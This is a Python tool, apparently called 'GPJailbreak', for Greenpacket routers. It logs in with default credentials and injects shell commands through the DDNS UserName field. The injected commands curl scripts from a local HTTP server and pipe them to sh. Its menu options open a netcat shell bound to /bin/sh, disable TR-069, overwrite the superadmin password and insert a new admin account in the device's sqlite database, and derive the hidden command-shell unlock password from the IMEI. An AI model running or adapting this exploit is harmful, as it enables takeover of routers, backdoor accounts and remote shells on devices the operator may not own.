import requests, json, re, time, os, sys, threading, base64, hashlib, random
import http.server
import socketserver

# Local settings for http payload server
settings_localip = "192.168.0.100"
settings_localport = 18080
# Greenpacket settings
settings_remote_ip = "192.168.0.1"
settings_user = "superadmin"
settings_password = "admin"

class httpd:
    def __init__(self, host='localhost', port=8000, directory='.'):
        self.host = host
        self.port = port
        self.directory = directory
        self.server = None
        self.thread = None
    def start(self):
        handler = lambda *args, **kwargs: http.server.SimpleHTTPRequestHandler(*args, directory=self.directory, **kwargs)
        self.server = socketserver.TCPServer((self.host, self.port), handler)
        self.server.allow_reuse_address = True
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        print(f"[HTTPD] Server started at http://{self.host}:{self.port}")
    def stop(self):
        if self.server:
            print("[HTTPD] Shutting down.")
            self.server.shutdown()
            self.server.server_close()
            if self.thread:
                self.thread.join(timeout=5)

def session_login():
    try:
        session = requests.Session()
        login = {'username': settings_user, 'password': settings_password}
        response = session.post(f'http://{settings_remote_ip}/web/v1/user/login', json = login)
        response.raise_for_status()
        auth_response = response.json()
        if( "Authorization" in auth_response["data"] ):
            return (True, auth_response["data"]["Authorization"])
        else:
            return (False, auth_response["msg"])
    except ValueError as e:
        print(f" malformed JSON: {e}")
        return (False, '')

def session_post(bearer, url, jsondata):
    try:
        session = requests.Session()
        headers = {
            "Authorization": f"{bearer}"
        }
        response = session.post(f'http://{settings_remote_ip}/{url}', headers=headers, json=jsondata)
        response.raise_for_status()
        json_response = response.json()
        if( json_response["code"] == 200 ):
            if( "data" in json_response):
                return (True, json_response["data"])
            else:
                return (True, json_response["msg"])
        else:
                return (False, json_response["msg"])
    except ValueError as e:
        print(f" malformed JSON: {e}")
        return None

def session_get(bearer, url, jsondata):
    try:
        session = requests.Session()
        headers = {
            "Authorization": f"{bearer}"
        }
        response = session.get(f'http://{settings_remote_ip}/{url}', headers=headers, json=jsondata)
        response.raise_for_status()
        json_response = response.json()
        if( json_response["code"] == 200 ):
            if( "data" in json_response):
                return (True, json_response["data"])
            else:
                return (True, '')
        else:
                return (False, json_response["msg"])
    except ValueError as e:
        print(f" malformed JSON: {e}")
        return False



session = session_login()
payloadserver = httpd(host=settings_localip,port=settings_localport,directory='./payloads/')

if(session[0]):
    session_token = session[1]
    # Start serving shell scripts, folder contains working templates they get rewriten on the fly.
    payloadserver.start()
    picker = ''
    # Templates for command injection
    # Commands are fetched from local http server due to lenght and url encode issues
    # To prevent soft-locking device API if command hangs i used timeout to force kill curl process
    ddns_cmd_inject = {'Service':'ZoneEdit.com','UserName':'AAAA','Password':'BBBB','HostName':'CCCC','Status':'','InternetIpAddress':''}
    ddns_clear = {'Service':'Disable','UserName':'','Password':'','HostName':'','Status':'','InternetIpAddress':''}

    while(True):
        print("======================================\n\n\tGPJailbreak v1.2\n\nOptions:\n\t1. Test connection\n\t2. Start netcat shell\n\t3. Disable TR-069\n\t4. Set superadmin password\n\t5. Add a superadmin account\n\t6. Unblock Command Shell\n\t7. Set proper firewall.\n\t8. Quit\n\n======================================")
        picker = input("==> ")
        match picker[0]:
            case '1':
                print("Testing connection, you should see device information:")
                device_status = session_get(session_token, '/web/v1/setting/deviceinfo', '')
                if( device_status[0] ):
                       reqbody = device_status[1]
                       print(f"Uptime {reqbody["RunningTime"]}")
                       print(f"Device name {reqbody["HardwareVersion"]}")
                       print(f"IMEI {reqbody["IMEI"]}")
                       print(f"SW Ver {reqbody["SoftwareVersion"]}")
                else:
                       print(f"Someting is wrong.... {device_status[1]}")
                input("Done!")
            case '2':
                print("Launching Ncat shell...")
                payload = ddns_cmd_inject
                payload["UserName"] = f";timeout 5 curl http://{settings_localip}:{settings_localport}/ncat.sh | sh;"
                # Generate payload on the fly to fill LAN ip correctly, default firewall is crap and lets both IPv4/6 access SSH that is on by default....
                payload_sh = open('payloads/ncat.sh', 'w')
                payload_sh.write(f'nohup nc -ll -p 6969 {settings_remote_ip} -e /bin/sh >/dev/null 2>&1 &\n')
                payload_sh.close()

                result1 = session_post(session_token, 'web/v1/setting/system/ddns', payload)
                if(result1[0]):
                    print(f"Ncat lisener started at {settings_remote_ip}:6969 !\nStop it by sending kill $(pgrep nc) to the device.")
                time.sleep(6)
                result2 = session_post(session_token, 'web/v1/setting/system/ddns', ddns_clear)
                if(result2[0]):
                   print("Settings cleanup ok")
                input("Done!")
            case '3':
                print("Starting TR-069 removal...")
                payload = ddns_cmd_inject
                payload["UserName"] = f";timeout 5 curl http://{settings_localip}:{settings_localport}/tr069.sh | sh;"
                # Hopefully this accualy saves systemctl too, H5 doesn't have a typical overlayfs setup
                result1 = session_post(session_token, 'web/v1/setting/system/ddns', payload)
                if(result1[0]):
                    print(f"TR-069 service has been stopped, disabled and defused. No more ISP spying.")
                time.sleep(6)
                result2 = session_post(session_token, 'web/v1/setting/system/ddns', ddns_clear)
                if(result2[0]):
                   print("Settings cleanup ok")
                input("Done!")
            case '4':
                print("Setting new superadmin account...")
                payload = ddns_cmd_inject
                payload["UserName"] = f";timeout 5 curl http://{settings_localip}:{settings_localport}/superadmin.sh | sh;"

                userpassword = ''.join(random.choices("1234567890qwertzuiopASDFGHJKLyxcvbnm", k=16))
                # Note that other devices like D5H don't have a superadmin account, more work needed
                # Zain and Irancell firmwares only have admin user with extra settings for restricting user access from LAN/WAN
                payload_sh = open('payloads/superadmin.sh', 'w')
                payload_sh.write(f'\n')
                payload_sh.write(f'passwdmd5=`echo -n {userpassword} |md5sum|cut -d" " -f1`\n')
                payload_sh.write(f'sqlite3 /data/turin/web/datas/memohi.db "UPDATE users SET password = \'$passwdmd5\' WHERE username = \'superadmin\'";\n')
                payload_sh.close()

                result1 = session_post(session_token, 'web/v1/setting/system/ddns', payload)
                if(result1[0]):
                    print(f"New super admin account password is set to: {userpassword}\n.")
                time.sleep(6)
                result2 = session_post(session_token, 'web/v1/setting/system/ddns', ddns_clear)
                if(result2[0]):
                   print("Settings cleanup ok")
                input("Done!")
            case '5':
                print("Adding new superadmin account...")
                payload = ddns_cmd_inject
                payload["UserName"] = f";timeout 5 curl http://{settings_localip}:{settings_localport}/adduser.sh | sh;"

                username = f"superadmin{random.randint(10, 99)}"
                userpassword = ''.join(random.choices("1234567890qwertzuiopASDFGHJKLyxcvbnm", k=16))

                payload_sh = open('payloads/adduser.sh', 'w')
                payload_sh.write(f'\n')
                payload_sh.write(f'passwdmd5=`echo -n {userpassword} |md5sum|cut -d" " -f1`\n')
                payload_sh.write(f'sqlite3 /data/turin/web/datas/memohi.db "delete from users where id=\'69\'"\n') # Delete old user with this ID
                payload_sh.write(f'sqlite3 /data/turin/web/datas/memohi.db "INSERT INTO users (\'id\', \'username\', \'password\', \'roletype\', \'firstlogin\') VALUES (69, \'{username}\', \'$passwdmd5\', \'admin\', false);"\n')
                payload_sh.close()

                result1 = session_post(session_token, 'web/v1/setting/system/ddns', payload)
                if(result1[0]):
                    print(f"New super admin account has been added: {username} / {userpassword}\nRunning this function again will re-create new random login.")
                time.sleep(6)
                result2 = session_post(session_token, 'web/v1/setting/system/ddns', ddns_clear)
                if(result2[0]):
                   print("Settings cleanup ok")
                input("Done!")
            case '6':
                print("Unlocking Command Shell...")
                device_status = session_get(session_token, '/web/v1/setting/deviceinfo', '')
                # Calls to cped service over ubus, unsure how usefull it is outside just reading statistics. Output buffer is quite small
.               # If firmware has the shell menu hidden you can still send commands with requests :)
                if( device_status[0] ):
                    device_imei = device_status[1]["IMEI"]
                    imei_b64 =  base64.b64encode(bytes(device_imei,"utf8")).decode("utf-8")
                    imei_md5 =  hashlib.md5(bytes(device_imei,"utf8")).hexdigest()
                    shell_password = hashlib.md5( bytes(f"{device_imei}{imei_b64}{imei_md5}","utf8") ).hexdigest()
                    result = session_post(session_token, 'web/v1/setting/network/cmdshell', {'Command': shell_password,'CommandRunningResults':''} )
                    if(result[0]):
                        print(result[1])
                    else:
                        print(f"Unlock command failed: {result[1]}")
                else:
                   print("Cant get IMEI")
                input("Done!")
            case '7':
                print("Firewall fixup...")
                payload = ddns_cmd_inject
                payload["UserName"] = f";timeout 5 curl http://{settings_localip}:{settings_localport}/firewall.sh | sh;"

                result1 = session_post(session_token, 'web/v1/setting/system/ddns', payload)
                if(result1[0]):
                    print(f"Sucess.")
                time.sleep(6)
                result2 = session_post(session_token, 'web/v1/setting/system/ddns', ddns_clear)
                if(result2[0]):
                   print("Settings cleanup ok")
                input("Done!")
            case '8':
                print( "Logging out and exiting, bye!" )
                print( session_post(session_token, 'web/v1/user/logout', '') )
                payloadserver.stop()
                sys.exit()
            case _:
                print( "nuh uh" )
        sys.stdout.write('\x1b\x5b\x48\x1b\x5b\x32\x4a\x1b\x5b\x33\x4a')
else:
    print(f"Login failed: {session[1]}")


